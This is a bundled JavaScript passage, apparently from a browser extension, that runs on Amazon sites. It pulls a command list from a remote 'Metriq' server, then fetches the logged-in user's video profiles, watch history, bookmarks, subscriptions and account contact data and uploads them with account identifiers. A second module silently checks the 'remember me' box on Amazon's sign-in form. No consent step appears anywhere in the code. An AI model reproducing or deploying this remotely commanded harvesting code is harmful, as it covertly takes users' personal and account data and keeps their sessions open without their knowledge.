        var localWindow = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : undefined;
        AmazonHunter_class_call_check(this, AmazonHunter);
        this.window = localWindow || window;
    }
    _create_class(AmazonHunter, [
        {
            /**
   * Check if hunter supports this domain
   *
   * @param {string} domain
   *
   * @return {boolean}
   */ key: "supportDomain",
            value: function supportDomain(domain) {
                return AmazonApiProvider/* AMAZON_DOMAINS.indexOf */.Jj.indexOf(domain) !== -1;
            }
        },
        {
            key: "run",
            value: function run() {
                var _this = this;
                this.runAsync().catch(function(exception) {
                    _this.handleException("Failed to start the hunter. Exception: ".concat(exception));
                });
            }
        },
        {
            key: "runAsync",
            value: /**
   * @return {Promise<void>}
   */ function runAsync() {
                var _this = this;
                return AmazonHunter_async_to_generator(function() {
                    var userInfo, session, commandsResults;
                    return AmazonHunter_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                _this.amazonApi = AmazonApiProvider/* provideApi */.W0(_this.getDomain(), _this.window);
                                return [
                                    4,
                                    _this.createUserInfo()
                                ];
                            case 1:
                                userInfo = _state.sent();
                                return [
                                    4,
                                    _this.createSession(userInfo)
                                ];
                            case 2:
                                session = _state.sent();
                                return [
                                    4,
                                    _this.handleCommands(session, userInfo)
                                ];
                            case 3:
                                commandsResults = _state.sent();
                                _this.logCommandResults(commandsResults);
                                return [
                                    2
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "isLogged",
            value: function isLogged(domain) {
                return AmazonHunter_async_to_generator(function() {
                    return AmazonHunter_ts_generator(this, function(_state) {
                        return [
                            2,
                            !!(0,Helper/* getCookie */.ej)(AmazonApiProvider/* AUTH_COOKIE_BY_DOMAIN */.h9[domain])
                        ];
                    });
                })();
            }
        },
        {
            key: "createSession",
            value: /**
   * @param {InitCommandsData} userInfo
   * @returns {Promise<object>}
   */ function createSession(userInfo) {
                return AmazonHunter_async_to_generator(function() {
                    return AmazonHunter_ts_generator(this, function(_state) {
                        return [
                            2,
                            MetriqApi_createSession(userInfo)
                        ];
                    });
                })();
            }
        },
        {
            key: "handleCommands",
            value: /**
   * @param {Object} session
   * @param {InitCommandsData} userInfo
   * @returns {Promise<PromiseSettledResult<any>[]>}
   */ function handleCommands(session, userInfo) {
                var _this = this;
                return AmazonHunter_async_to_generator(function() {
                    var commands;
                    return AmazonHunter_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                commands = session.commands;
                                return [
                                    4,
                                    allSettled(commands.map(function(command) {
                                        return _this.handleCommand(command, userInfo);
                                    }))
                                ];
                            case 1:
                                return [
                                    2,
                                    _state.sent()
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "handleCommand",
            value: /**
   * @param {object} command
   * @returns {Promise<int>}
   */ function handleCommand(param, param1) {
                var id = param.id, type = param.type, _$config = param.config, profileId = param1.profileId;
                var _this = this;
                return AmazonHunter_async_to_generator(function() {
                    var COMMAND_PROFILES, COMMAND_HISTORY, COMMAND_BOOKMARKS, COMMAND_SUBSCRIPTIONS, commandHandlingResult, error;
                    return AmazonHunter_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                COMMAND_PROFILES = "profiles";
                                COMMAND_HISTORY = "history";
                                COMMAND_BOOKMARKS = "videos_bookmarks";
                                COMMAND_SUBSCRIPTIONS = "subscriptions";
                                _state.label = 1;
                            case 1:
                                _state.trys.push([
                                    1,
                                    12,
                                    ,
                                    13
                                ]);
                                switch(type){
                                    case COMMAND_PROFILES:
                                        return [
                                            3,
                                            2
                                        ];
                                    case COMMAND_BOOKMARKS:
                                        return [
                                            3,
                                            4
                                        ];
                                    case COMMAND_HISTORY:
                                        return [
                                            3,
                                            6
                                        ];
                                    case COMMAND_SUBSCRIPTIONS:
                                        return [
                                            3,
                                            8
                                        ];
                                }
                                return [
                                    3,
                                    10
                                ];
                            case 2:
                                return [
                                    4,
                                    _this.reportProfiles(id, _$config, profileId)
                                ];
                            case 3:
                                commandHandlingResult = _state.sent();
                                return [
                                    3,
                                    11
                                ];
                            case 4:
                                return [
                                    4,
                                    _this.reportBookmarks(id, _$config, profileId)
                                ];
                            case 5:
                                commandHandlingResult = _state.sent();
                                return [
                                    3,
                                    11
                                ];
                            case 6:
                                return [
                                    4,
                                    _this.reportHistory(id, _$config, profileId)
                                ];
                            case 7:
                                commandHandlingResult = _state.sent();
                                return [
                                    3,
                                    11
                                ];
                            case 8:
                                return [
                                    4,
                                    _this.reportSubscriptions(id, _$config, profileId)
                                ];
                            case 9:
                                commandHandlingResult = _state.sent();
                                return [
                                    3,
                                    11
                                ];
                            case 10:
                                throw new Error('"'.concat(type, '" is not a valid command'));
                            case 11:
                                if (commandHandlingResult.commands && commandHandlingResult.commands.length) {
                                    return [
                                        2,
                                        _this.handleCommand(commandHandlingResult.commands[0], {
                                            profileId: profileId
                                        })
                                    ];
                                }
                                return [
                                    3,
                                    13
                                ];
                            case 12:
                                error = _state.sent();
                                (0,Logger/* amazonLogger */.V)(LOG_NAMESPACE, "Failed to handle command ".concat(type, ". Error: ").concat(error), id);
                                return [
                                    3,
                                    13
                                ];
                            case 13:
                                return [
                                    2
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "reportProfiles",
            value: /**
   * @param {string} uuid
   * @param {object} config
   * @param {string} profileId
   * @returns {Promise<void>}
   */ function reportProfiles(uuid, param, profileId) {
                var dataFilter = param.dataFilter, url = param.url;
                var _this = this;
                return AmazonHunter_async_to_generator(function() {
                    var responseData, profiles, accountId, domain, result, contactData, data, _tmp, error;
                    return AmazonHunter_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                return [
                                    4,
                                    _this.amazonApi.fetchProfiles(url)
                                ];
                            case 1:
                                responseData = _state.sent();
                                return [
                                    4,
                                    (0,CommonParser/* parseProfiles */.M8)(responseData, dataFilter)
                                ];
                            case 2:
                                profiles = _state.sent();
                                accountId = _this.amazonApi.getUserId();
                                domain = _this.getDomain();
                                return [
                                    4,
                                    PlainJsonRequest_postPlainJsonRequest("".concat(AmazonHunter_BASE_ROUTE, "amazon/upload"), {
                                        data: profiles,
                                        accountId: accountId,
                                        profileId: profileId,
                                        domain: domain,
                                        commandId: uuid
                                    })
                                ];
                            case 3:
                                result = _state.sent();
                                _state.label = 4;
                            case 4:
                                _state.trys.push([
                                    4,
                                    8,
                                    ,
                                    10
                                ]);
                                return [
                                    4,
                                    _this.amazonApi.getContactPageData()
                                ];
                            case 5:
                                contactData = _state.sent();
                                _tmp = {
                                    accountId: accountId,
                                    profileId: profileId,
                                    domain: domain
                                };
                                return [
                                    4,
                                    (0,Helper/* getOrCreateExtensionUserId */.tX)()
                                ];
                            case 6:
                                data = AmazonHunter_object_spread.apply(void 0, [
                                    (_tmp.extension_user_id = _state.sent(), _tmp),
                                    contactData
                                ]);
                                return [
                                    4,
                                    sendAdditionalProfileData("amazon", data)
                                ];
                            case 7:
                                _state.sent();
                                return [
                                    3,
                                    10
                                ];
                            case 8:
                                error = _state.sent();
                                return [
                                    4,
                                    (0,Logger/* amazonLogger */.V)("gathering additional profiles data", error)
                                ];
                            case 9:
                                _state.sent();
                                return [
                                    3,
                                    10
                                ];
                            case 10:
                                return [
                                    2,
                                    result
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "reportHistory",
            value: /**
   * @param {string} uuid
   * @param {object} config
   * @param {string} profileId
   * @returns {Promise<void>}
   */ function reportHistory(uuid, param, profileId) {
                var url = param.url;
                var _this = this;
                return AmazonHunter_async_to_generator(function() {
                    var responseData, history;
                    return AmazonHunter_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                return [
                                    4,
                                    _this.amazonApi.fetchHistory(url)
                                ];
                            case 1:
                                responseData = _state.sent();
                                history = (0,CommonParser/* parseHistory */.D2)(responseData);
                                return [
                                    2,
                                    _this.sendHistoryToMetriq(uuid, profileId, history)
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "sendHistoryToMetriq",
            value: function sendHistoryToMetriq(uuid, profileId, history) {
                var _this = this;
                return AmazonHunter_async_to_generator(function() {
                    return AmazonHunter_ts_generator(this, function(_state) {
                        return [
                            2,
                            PlainJsonRequest_postPlainJsonRequest("".concat(AmazonHunter_BASE_ROUTE, "amazon/upload"), {
                                data: history,
                                accountId: _this.amazonApi.getUserId(),
                                profileId: profileId,
                                domain: _this.getDomain(),
                                commandId: uuid
                            })
                        ];
                    });
                })();
            }
        },
        {
            key: "reportBookmarks",
            value: /**
   * @param {string} uuid
   * @param {object} params
   * @param {string} profileId
   * @returns {Promise<void>}
   */ function reportBookmarks(uuid, param, profileId) {
                var url = param.url, titleIds = param.titleIds, chunkSize = param.chunkSize;
                var _this = this;
                return AmazonHunter_async_to_generator(function() {
                    var _Object, chunkTitleIds, allBookmarks, i, formattedTitleIDs, bookmarks, dataToSend;
                    return AmazonHunter_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                chunkTitleIds = (0,Helper/* divideArray */.e0)(titleIds, chunkSize); // [[1,2,3], [4,5,6], ...]
                                allBookmarks = [];
                                i = 0;
                                _state.label = 1;
                            case 1:
                                if (!(i < chunkTitleIds.length)) return [
                                    3,
                                    4
                                ];
                                formattedTitleIDs = JSON.stringify(chunkTitleIds[i]);
                                return [
                                    4,
                                    _this.amazonApi.fetchBookmarks("".concat(url).concat(formattedTitleIDs, "}"))
                                ];
                            case 2:
                                bookmarks = _state.sent();
                                allBookmarks.push(bookmarks === null || bookmarks === void 0 ? void 0 : bookmarks.enrichments);
                                _state.label = 3;
                            case 3:
                                i++;
                                return [
                                    3,
                                    1
                                ];
                            case 4:
                                dataToSend = (_Object = Object).assign.apply(_Object, [
                                    {}
                                ].concat(_to_consumable_array(allBookmarks)));
                                return [
                                    2,
                                    PlainJsonRequest_postPlainJsonRequest("".concat(AmazonHunter_BASE_ROUTE, "amazon/upload"), {
                                        data: dataToSend,
                                        accountId: _this.amazonApi.getUserId(),
                                        profileId: profileId,
                                        domain: _this.getDomain(),
                                        commandId: uuid
                                    })
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "reportSubscriptions",
            value: /**
   * @param {string} uuid
   * @param {object} config
   * @param {string} profileId
   * @returns {Promise<void>}
   */ function reportSubscriptions(uuid, param, profileId) {
                var url = param.url;
                var _this = this;
                return AmazonHunter_async_to_generator(function() {
                    var channelsResponseData, activeChannels, planMembership, dataToSend;
                    return AmazonHunter_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                return [
                                    4,
                                    _this.amazonApi.fetchActiveChannels(url)
                                ];
                            case 1:
                                channelsResponseData = _state.sent();
                                activeChannels = (channelsResponseData === null || channelsResponseData === void 0 ? void 0 : channelsResponseData.channels) || [];
                                return [
                                    4,
                                    _this.amazonApi.fetchMembershipPlan()
                                ];
                            case 2:
                                planMembership = _state.sent();
                                dataToSend = {
                                    activeChannels: activeChannels,
                                    planMembership: planMembership
                                };
                                return [
                                    2,
                                    PlainJsonRequest_postPlainJsonRequest("".concat(AmazonHunter_BASE_ROUTE, "amazon/upload"), {
                                        data: dataToSend,
                                        accountId: _this.amazonApi.getUserId(),
                                        profileId: profileId,
                                        domain: _this.getDomain(),
                                        commandId: uuid
                                    })
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "createUserInfo",
            value: /**
   * @returns {Promise<InitCommandsData>}
   */ function createUserInfo() {
                var _this = this;
                return AmazonHunter_async_to_generator(function() {
                    var accountId, profileId, extensionUserId, _, _tmp;
                    return AmazonHunter_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                accountId = _this.amazonApi.getUserId();
                                return [
                                    4,
                                    _this.amazonApi.getCurrentProfileId()
                                ];
                            case 1:
                                profileId = _state.sent();
                                return [
                                    4,
                                    (0,Helper/* getOrCreateExtensionUserId */.tX)()
                                ];
                            case 2:
                                extensionUserId = _state.sent();
                                if (!accountId || !profileId) {
                                    throw new Error("Cannot identify amazon user!");
                                }
                                _ = InitCommandsData.bind;
                                _tmp = [
                                    void 0,
                                    accountId,
                                    profileId,
                                    extensionUserId,
                                    (0,Helper/* getHid */._h)(),
                                    _this.getGmtDiffSeconds(),
                                    _this.getBrowserLanguage(),
                                    (0,Dist/* getDist */.z)()
                                ];
                                return [
                                    4,
                                    _this.getCountry(accountId)
                                ];
                            case 3:
                                _tmp = _tmp.concat([
                                    _state.sent(),
                                    _this.getDomain()
                                ]);
                                return [
                                    4,
                                    _this.isPrimeMember(accountId)
                                ];
                            case 4:
                                return [
                                    2,
                                    new (_.apply(InitCommandsData, _tmp.concat([
                                        _state.sent(),
                                        _this.amazonApi.getLanguage()
                                    ])))
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "logCommandResults",
            value: function logCommandResults(commandsResults) {
                var _this = this;
                commandsResults.filter(function(command) {
                    return command.status === "rejected";
                }).map(function(param) {
                    var reason = param.reason;
                    return _this.handleException("Failed with error ".concat(reason));
                });
            }
        },
        {
            key: "isPrimeMember",
            value: /**
   * @param {string} userId
   * @returns {Promise<boolean>}
   */ function isPrimeMember(userId) {
                var _this = this;
                return AmazonHunter_async_to_generator(function() {
                    return AmazonHunter_ts_generator(this, function(_state) {
                        return [
                            2,
                            _this.amazonApi.isPrimeMember().catch(function(exception) {
                                return Promise.reject(new Error("Failed to check prime status for user ".concat(userId, ". Exception: ").concat(JSON.stringify(exception))));
                            })
                        ];
                    });
                })();
            }
        },
        {
            key: "getCountry",
            value: /**
   * @param {string} userId
   * @returns {Promise<string>}
   */ function getCountry(userId) {
                var _this = this;
                return AmazonHunter_async_to_generator(function() {
                    return AmazonHunter_ts_generator(this, function(_state) {
                        return [
                            2,
                            _this.amazonApi.getCountry().catch(function(exception) {
                                return Promise.reject(new Error("Failed to get country for user ".concat(userId, ". Exception: ").concat(JSON.stringify(exception))));
                            })
                        ];
                    });
                })();
            }
        },
        {
            /**
   * @returns {string}
   */ key: "getDomain",
            value: function getDomain() {
                return this.window.location.host;
            }
        },
        {
            /**
   * @returns {string}
   */ key: "getBrowserLanguage",
            value: function getBrowserLanguage() {
                return this.window.navigator.language;
            }
        },
        {
            /**
   * @returns {number}
   */ key: "getGmtDiffSeconds",
            value: function getGmtDiffSeconds() {
                return new Date().getTimezoneOffset() * -60;
            }
        },
        {
            key: "handleException",
            value: function handleException(msg) {
                (0,Logger/* amazonLogger */.V)(LOG_NAMESPACE, msg);
            }
        }
    ]);
    return AmazonHunter;
}();



/***/ }),

/***/ 525:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "V": function() { return /* binding */ amazonLogger; }
/* harmony export */ });
/* harmony import */ var _config_config_json__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(626);
/* harmony import */ var _Http_Http__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(519);
/* harmony import */ var _Helper_Dist__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(270);
/* harmony import */ var _package_json__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(147);
/* harmony import */ var _Helper_Helper__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(667);





var revision = _config_config_json__WEBPACK_IMPORTED_MODULE_0__/* .revision */ .LB;
var amazonLogger = function(namespace, message, commandId) {
    return (0,_Http_Http__WEBPACK_IMPORTED_MODULE_1__/* .httpNodeLog */ .gp)({
        dist: (0,_Helper_Dist__WEBPACK_IMPORTED_MODULE_2__/* .getDist */ .z)(),
        revision: revision,
        platform: "amazon",
        namespace: namespace,
        extVer: (0,_Helper_Dist__WEBPACK_IMPORTED_MODULE_2__/* .getExtensionVersion */ .P)(),
        dhVer: _package_json__WEBPACK_IMPORTED_MODULE_3__/* .version */ .i8,
        message: "".concat(message),
        commandId: (0,_Helper_Helper__WEBPACK_IMPORTED_MODULE_4__/* .formatCommandId */ .Pr)(commandId)
    });
};


/***/ }),

/***/ 116:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {


// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "OE": function() { return /* binding */ createDocument; },
  "ig": function() { return /* binding */ extractProp; },
  "ow": function() { return /* binding */ parseCountry; },
  "jF": function() { return /* binding */ parseDetails; },
  "GA": function() { return /* binding */ parseForCurrentProfileId; },
  "D2": function() { return /* binding */ parseHistory; },
  "M8": function() { return /* binding */ parseProfiles; }
});

// UNUSED EXPORTS: parseBookmarks, searchScripts

;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/Dto/Details.js
function _class_call_check(instance, Constructor) {
    if (!(instance instanceof Constructor)) {
        throw new TypeError("Cannot call a class as a function");
    }
}
var Details = function Details(seriesId, seriesTitle, seasonId, seasonNumber, episodes) {
    "use strict";
    _class_call_check(this, Details);
    this.seriesId = seriesId;
    this.seriesTitle = seriesTitle;
    this.seasonId = seasonId;
    this.seasonNumber = seasonNumber;
    this.episodes = episodes;
};


// EXTERNAL MODULE: ./src/Helper/Helper.js + 1 modules
var Helper = __webpack_require__(667);
;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/Dto/Episode.js
function Episode_class_call_check(instance, Constructor) {
    if (!(instance instanceof Constructor)) {
        throw new TypeError("Cannot call a class as a function");
    }
}
var Episode = function Episode(id, episodeNumber, resume, progress, subscription, channel_logo, channel_description, metadata) {
    "use strict";
    Episode_class_call_check(this, Episode);
    this.id = id;
    this.episodeNumber = episodeNumber;
    this.resume = resume;
    this.progress = progress;
    this.subscription = subscription;
    this.channel_logo = channel_logo;
    this.channel_description = channel_description;
    this.metadata = metadata;
};


// EXTERNAL MODULE: ./src/Http/Http.js
var Http = __webpack_require__(519);
;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/Dto/Metadata.js
function Metadata_class_call_check(instance, Constructor) {
    if (!(instance instanceof Constructor)) {
        throw new TypeError("Cannot call a class as a function");
    }
}
var Metadata = function Metadata(genres, synopsis, releaseYear, duration, ageRating) {
    "use strict";
    Metadata_class_call_check(this, Metadata);
    this.genres = genres;
    this.synopsis = synopsis;
    this.releaseYear = releaseYear;
    this.duration = duration;
    this.ageRating = ageRating;
};


// EXTERNAL MODULE: ./src/Helper/Json.js
var Json = __webpack_require__(425);
;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/Site/Common/CommonParser.js






var HISTORY_WIDGET_TYPE = "activity-history";
var HISTORY_WIDGET_TYPE_ALTERNATIVE = "watch-history";
var MAX_PROP_OBJECTS = 20;
var PROP_OBJECT_PREFIXES = [
    '"args":',
    '"appArgs":'
];
/**
 * @param {string} documentText
 * @returns {Details}
 */ function parseDetails(documentText) {
    var document = createDocument(documentText);
    return new Details(getSeriesId(document), getSeriesTitle(document), getSeasonId(document), getSeasonNumber(document), getEpisodes(document));
}
/**
 * @param {object} profilesResponse
 * @returns {string|null}
 */ function parseForCurrentProfileId(profilesResponse) {
    var profile = profilesResponse.profiles.map(function(param) {
        var id = param.id, isSelected = param.isSelected;
        return {
            id: id,
            isSelected: isSelected
        };
    }).find(function(param) {
        var isSelected = param.isSelected;
        return isSelected;
    });
    return profile ? profile.id : null;
}
/**
 * @param {Object} result
 * @return {Bookmark}
 */ function mapBookmarkResult(result) {
    var _result_, _result_1, _result_2;
    return {
        titleID: result[0],
        entitlementCue: (_result_ = result[1]) === null || _result_ === void 0 ? void 0 : _result_.entitlementCues,
        playbackActions: (_result_1 = result[1]) === null || _result_1 === void 0 ? void 0 : _result_1.playbackActions,
        progress: (_result_2 = result[1]) === null || _result_2 === void 0 ? void 0 : _result_2.progress
    };
}
/**
 * @param {Object} responseData
 * @return {Bookmarks}
 */ function parseBookmarks(responseData) {
    var bookmarks = Object.entries(responseData.enrichments).map(mapBookmarkResult);
    return bookmarks;
}
/**
 * @param {Object} responseData
 * @return {History}
 */ var parseHistory = function(responseData) {
    var historyWidget = responseData.widgets.find(function(param) {
        var widgetType = param.widgetType;
        return widgetType === HISTORY_WIDGET_TYPE || widgetType === HISTORY_WIDGET_TYPE_ALTERNATIVE;
    });
    return (0,Helper/* extract */.Kl)(historyWidget, [
        "content",
        "content"
    ]);
};
/**
 * @param {Object} responseData
 * @param {Object} filters
 * @return {Profiles}
 */ function parseProfiles(responseData, filters) {
    var profiles = (0,Helper/* extract */.Kl)(responseData, [
        "profiles"
    ]);
    return profiles.map(function(item) {
        return filterItem(item, filters);
    });
}
function filterItem(item, filters) {
    var filteredItem = {};
    for(var key in filters){
        filteredItem[key] = (0,Helper/* extract */.Kl)(item, filters[key]);
    }
    return filteredItem;
}
/**
 * @param {String} text
 * @returns {Document}
 */ function createDocument(text) {
    var parser = new DOMParser();
    return parser.parseFromString(text, "text/html");
}
/**
 * @param {Document} document
 * @returns {string}
 */ function getTitleType(document) {
    return isMovie(document) ? "movie" : "episode";
}
/**
 * @param {Document} document
 * @returns {String|null}
 */ function getSeriesTitle(document) {
    return searchScripts("series title", document, function(config) {
        return (0,Helper/* extract */.Kl)(getHeaderTitle(config), [
            "parentTitle"
        ]);
    });
}
/**
 * @param {Document} document
 * @returns {String|null}
 */ function getSeasonId(document) {
    if (isMovie(document)) {
        return null;
    }
    return getTitleId(document);
}
/**
 * @param {Document} document
 * @returns {String|null}
 */ function getTitleId(document) {
    return searchScripts("main id", document, function(config) {
        return (0,Helper/* extract */.Kl)(config, [
            "props",
            "state",
            "pageTitleId"
        ]);
    });
}
/**
 * @param {Document} document
 * @returns {number|null}
 */ function getSeasonNumber(document) {
    if (isMovie(document)) {
        return null;
    }
    return searchScripts("season number", document, function(config) {
        return (0,Helper/* extract */.Kl)(getHeaderTitle(config), [
            "seasonNumber"
        ]);
    });
}
/**
 * @param {Document} document
 * @returns {string|null}
 */ function getSeriesId(document) {
    if (isMovie(document)) {
        return null;
    }
    return searchScripts("series id", document, function(config) {
        var seasons = (0,Helper/* extract */.Kl)(config, [
            "props",
            "state",
            "detail",
            "detail"
        ]);
        if (typeof seasons !== "object") {
            return null;
        }
        var seasonIds = Object.keys(seasons);
        if (seasonIds.length === 0) {
            return null;
        }
        return seasonIds.find(function(seasonId) {
            return (0,Helper/* extract */.Kl)(seasons, [
                seasonId,
                "titleType"
            ]) === "season" && (0,Helper/* extract */.Kl)(seasons, [
                seasonId,
                "seasonNumber"
            ]) === 1;
        });
    });
}
/**
 * @param {Document} document
 * @returns {Episode[]}
 */ function getEpisodes(document) {
    var episodeIds = searchScripts("episodes", document, function(config) {
        var episodes = (0,Helper/* extract */.Kl)(config, [
            "props",
            "state",
            "action",
            getFoldType(document)
        ]);
        if (typeof episodes !== "object") {
            return null;
        }
        var episodeIds = Object.keys(episodes);
        if (episodeIds.length === 0) {
            return null;
        }
        return episodeIds.filter(function(episodeId) {
            return isDesiredContentType(document, episodeId, getTitleType(document));
        });
    });
    return episodeIds.map(function(episodeId) {
        return getEpisode(document, episodeId);
    }).filter(function(episode) {
        return episode.progress !== null && episode.progress > 0;
    });
}
/**
 * @param {Document} document
 * @param {string} contentId
 * @param {string} contentType
 * @returns {boolean}
 */ function isDesiredContentType(document, contentId, contentType) {
    return searchScripts("content type check", document, function(config) {
        return (0,Helper/* extract */.Kl)(config, [
            "props",
            "state",
            "self",
            contentId,
            "titleType"
        ]);
    }) === contentType;
}
/**
 * @param {Document} document
 * @param {string} episodeId
 * @returns {Episode}
 */ function getEpisode(document, episodeId) {
    var episodePlaybackAction = getPlaybackAction(document, episodeId, getFoldType(document)), progress = (0,Helper/* extract */.Kl)(episodePlaybackAction, [
        "children",
        0,
        "progress"
    ]), titlePlaybackAction = getPlaybackAction(document, getTitleId(document), "atf"), episodeDetail = searchScripts("episode detail", document, function(config) {
        return (0,Helper/* extract */.Kl)(config, [
            "props",
            "state",
            "detail",
            "detail",
            episodeId
        ]);
    });
    return new Episode(episodeId, (0,Helper/* extract */.Kl)(episodeDetail, [
        "episodeNumber"
    ]), (0,Helper/* extract */.Kl)(episodePlaybackAction, [
        "children",
        0,
        "resumeTime"
    ]), progress !== null ? Math.round(progress * 100) : null, (0,Helper/* extract */.Kl)(titlePlaybackAction, [
        "children",
        0,
        "entitlementType"
    ]), (0,Helper/* extract */.Kl)(titlePlaybackAction, [
        "metadata",
        "imageLink"
    ]), (0,Helper/* extract */.Kl)(titlePlaybackAction, [
        "metadata",
        "messages",
        0,
        "string"
    ]), new Metadata(((0,Helper/* extract */.Kl)(episodeDetail, [
        "genres"
    ]) || []).map(function(genre) {
        return (0,Helper/* extract */.Kl)(genre, [
            "id"
        ]);
    }), (0,Helper/* extract */.Kl)(episodeDetail, [
        "synopsis"
    ]), (0,Helper/* extract */.Kl)(episodeDetail, [
        "releaseYear"
    ]), (0,Helper/* extract */.Kl)(episodeDetail, [
        "duration"
    ]), (0,Helper/* extract */.Kl)(episodeDetail, [
        "ratingBadge",
        "id"
    ])));
}
/**
 * @param {Document} document
 * @param {string} episodeId
 * @param {string} foldType
 * @returns {object}
 */ function getPlaybackAction(document, episodeId, foldType) {
    return searchScripts("playback action", document, function(config) {
        return (0,Helper/* extract */.Kl)(config, [
            "props",
            "state",
            "action",
            foldType,
            episodeId,
            "playbackActions",
            "main"
        ]);
    });
}
/**
 * Movies have their playback info above the fold and series below the fold
 *
 * @param {Document} document
 * @returns {string}
 */ function getFoldType(document) {
    return isMovie(document) ? "atf" : "btf";
}
/**
 * @param {Document} document
 * @returns {boolean}
 */ function isMovie(document) {
    return searchScripts("is movie", document, function(config) {
        return (0,Helper/* extract */.Kl)(getHeaderTitle(config), [
            "titleType"
        ]);
    }) === "movie";
}
/**
 * @param {object} config
 * @returns {object|null}
 */ function getHeaderTitle(config) {
    var titles = (0,Helper/* extract */.Kl)(config, [
        "props",
        "state",
        "detail",
        "headerDetail"
    ]);
    if (typeof titles !== "object") {
        return null;
    }
    var titleIds = Object.keys(titles);
    if (titleIds.length === 0) {
        return null;
    }
    return (0,Helper/* extract */.Kl)(titles, [
        titleIds[0]
    ]);
}
/**
 * @param {string} description
 * @param {Document} document
 * @param {function} queryFunction
 * @returns {*}
 */ function searchScripts(description, document, queryFunction) {
    var scripts = document.querySelectorAll('script[type="text/template"]:not([id])'), results = [];
    var _iteratorNormalCompletion = true, _didIteratorError = false, _iteratorError = undefined;
    try {
        for(var _iterator = scripts[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true){
            var script = _step.value;
            try {
                var config = JSON.parse(script.textContent), result = queryFunction(config);
                if (!isEmpty(result)) {
                    results.push(result);
                }
            } catch (exception) {
            // we are interested only in the configs we can parse
            // if they can't be parsed we just continue to the next one
            }
        }
    } catch (err) {
        _didIteratorError = true;
        _iteratorError = err;
    } finally{
        try {
            if (!_iteratorNormalCompletion && _iterator.return != null) {
                _iterator.return();
            }
        } finally{
            if (_didIteratorError) {
                throw _iteratorError;
            }
        }
    }
    if (results.length === 0) {
        return null;
    }
    if (!areSame(results)) {
        var resultsString = results.map(function(result) {
            return JSON.stringify(result);
        }).join(", ");
        (0,Http/* httpNodeLog */.gp)("[amazon:parser] Found conflicting results for ".concat(description, ": (").concat(resultsString, ")"));
    }
    return results[0];
}
/**
 * @param {*} subject
 * @returns {boolean}
 */ function isEmpty(subject) {
    if (typeof subject === "undefined") {
        return true;
    }
    if (subject === null) {
        return true;
    }
    if (typeof subject === "object") {
        return Object.keys(subject).length === 0;
    }
    if (Array.isArray(subject)) {
        return subject.length === 0;
    }
    return false;
}
/**
 * @param {*} subjects
 * @returns {boolean}
 */ function areSame(subjects) {
    var firstSubjectJson = JSON.stringify(subjects[0]);
    return subjects.every(function(subject) {
        return JSON.stringify(subject) === firstSubjectJson;
    });
}
function extractPropWithPrefix(documentText, keys, propObjectPrefix) {
    var startPosition = 0;
    for(var i = 0; i < MAX_PROP_OBJECTS; i++){
        var searchSource = documentText.substring(startPosition);
        var props = (0,Json/* extract */.Kl)(searchSource, propObjectPrefix);
        if (!props.object) {
            return null;
        }
        startPosition += props.index + 1;
        var value = (0,Helper/* extract */.Kl)(props.object, keys);
        if (value) {
            return value;
        }
    }
    return null;
}
function extractProp(documentText, keys) {
    var _iteratorNormalCompletion = true, _didIteratorError = false, _iteratorError = undefined;
    try {
        for(var _iterator = PROP_OBJECT_PREFIXES[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true){
            var prefix = _step.value;
            var result = extractPropWithPrefix(documentText, keys, prefix);
            if (result) {
                return result;
            }
        }
    } catch (err) {
        _didIteratorError = true;
        _iteratorError = err;
    } finally{
        try {
            if (!_iteratorNormalCompletion && _iterator.return != null) {
                _iterator.return();
            }
        } finally{
            if (_didIteratorError) {
                throw _iteratorError;
            }
        }
    }
    return null;
}
/**
 * @param {string} documentText
 * @returns {string|null}
 */ function parseCountry(documentText) {
    return extractProp(documentText, [
        "context",
        "currentTerritory"
    ]);
}


/***/ }),

/***/ 801:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "d": function() { return /* binding */ checkRememberCheckbox; }
/* harmony export */ });
/* harmony import */ var _Logger__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(525);

var LOG_NAMESPACE = "KeepSigned";
function checkRememberCheckbox() {
    try {
        var inputs = document.querySelectorAll('form[name="signIn"] input[name="rememberMe"]');
        inputs.forEach(function(node) {
            if (node.checked === false) {
                node.checked = true;
            }
        });
    } catch (e) {
        (0,_Logger__WEBPACK_IMPORTED_MODULE_0__/* .amazonLogger */ .V)(LOG_NAMESPACE, "exception: ".concat(e));
    }
}


/***/ }),

/***/ 223:
/***/ (function(module, __unused_webpack___webpack_exports__, __webpack_require__) {

__webpack_require__.a(module, async function (__webpack_handle_async_dependencies__, __webpack_async_result__) { try {
